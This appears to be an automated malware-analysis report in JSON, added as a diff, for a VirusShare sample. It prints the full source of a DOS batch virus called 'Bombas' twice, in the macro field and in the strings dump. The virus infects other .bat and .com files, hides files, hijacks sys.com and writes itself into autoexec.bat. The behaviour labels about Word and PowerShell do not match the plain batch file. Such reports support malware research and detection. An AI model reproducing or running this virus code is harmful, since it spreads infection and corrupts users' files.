@@ -1,0 +1,82 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "AUTOEXEC": "Runs when the Word document is opened",
+            "call": "May call a DLL using Excel 4 Macros",
+            "command": "May run PowerShell commands",
+            "windows": "May enumerate application windows"
+        },
+        "macro": ":Bombas on your computer 2y\n@echo off\nif \"%0\"==\"sys.bat\" goto syst\nif \"%0\"==\"sys\" goto syst\nset sys=%windir%\nset bombs=copy\nif \"%0\"==\"AUTOEXEC.BAT\" goto  aut\ngoto rep\n:aut\n@echo off\necho Bombas ver 1.19 on your computer! Be well...\nexit\n:rep\nfor %%w in (*.bat) do set bas=%%w\nfind \"bas\" %%w\nif errorlevel 1 type %0>>%bas%\nset boom= *.com\nctty nul\nbombs %0 %winbootdir%\\%0\nbombs %0 ..\nif not exist %boom% goto end\nfor %%i in (%boom% ..\\%boom%) do bombs %%i *.vdv\nfor %%k in (%boom% ..\\%boom%) do bombs %0 %%k\nren *.com *.bat\nattrib *.vdv + h\nattrib %0 -h\ngoto rep\nif exist c:\\windows\\command\\sys.old goto end\nbombs %0 %sys%\\command\\sys.bat\ncall ren %sys%\\command\\sys.com sys.old\nattrib c:\\windows\\command\\sys.old +h\ngoto end\n:syst\nattrib %sys%\\command\\sys.old -h\nren %sys%\\command\\sys.old sys.com\nsys.com %1 %2\nren %sys%\\command\\sys.com sys.old\nattrib %sys%\\command\\sys.old +h\nbombs %sys%\\command\\sys.bat %1\\autoexec.bat >nul\nbombs %sys%\\command\\attrib.exe %1\\attrib.exe >nul\ntype %0 >> %1\\autoexec.bat\nattrib %1\\autoexec.bat +r\n:end\n"
+    },
+    "filename": "VirusShare_0e6fd2e83608f7fa7845f1b21188bf01",
+    "filesize": 1078,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "0e6fd2e83608f7fa7845f1b21188bf01",
+        "sha1": "43538e7e246da555744a47a6e12b77d5628c900d",
+        "sha256": "ea911b1cbe6304cb661dcf84472d9ca9851b4a1e4a1bb851cd7c77d6cf98a03b"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            ":Bombas on your computer 2y",
+            "@echo off",
+            "if \"%0\"==\"sys.bat\" goto syst",
+            "if \"%0\"==\"sys\" goto syst",
+            "set sys=%windir%",
+            "set bombs=copy",
+            "if \"%0\"==\"AUTOEXEC.BAT\" goto  aut",
+            "goto rep",
+            ":aut",
+            "@echo off",
+            "echo Bombas ver 1.19 on your computer! Be well...",
+            "exit",
+            ":rep",
+            "for %%w in (*.bat) do set bas=%%w",
+            "find \"bas\" %%w",
+            "if errorlevel 1 type %0>>%bas%",
+            "set boom= *.com",
+            "ctty nul",
+            "bombs %0 %winbootdir%\\%0",
+            "bombs %0 ..",
+            "if not exist %boom% goto end",
+            "for %%i in (%boom% ..\\%boom%) do bombs %%i *.vdv",
+            "for %%k in (%boom% ..\\%boom%) do bombs %0 %%k",
+            "ren *.com *.bat",
+            "attrib *.vdv + h",
+            "attrib %0 -h",
+            "goto rep",
+            "if exist c:\\windows\\command\\sys.old goto end",
+            "bombs %0 %sys%\\command\\sys.bat",
+            "call ren %sys%\\command\\sys.com sys.old",
+            "attrib c:\\windows\\command\\sys.old +h",
+            "goto end",
+            ":syst",
+            "attrib %sys%\\command\\sys.old -h",
+            "ren %sys%\\command\\sys.old sys.com",
+            "sys.com %1 %2",
+            "ren %sys%\\command\\sys.com sys.old",
+            "attrib %sys%\\command\\sys.old +h",
+            "bombs %sys%\\command\\sys.bat %1\\autoexec.bat >nul",
+            "bombs %sys%\\command\\attrib.exe %1\\attrib.exe >nul",
+            "type %0 >> %1\\autoexec.bat",
+            "attrib %1\\autoexec.bat +r",
+            ":end"
+        ],
+        "file": {
+            "call ren %sys%\\command\\sys.com sys.old": "Backup",
+            "ren %sys%\\command\\sys.com sys.old": "Backup"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.295896",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
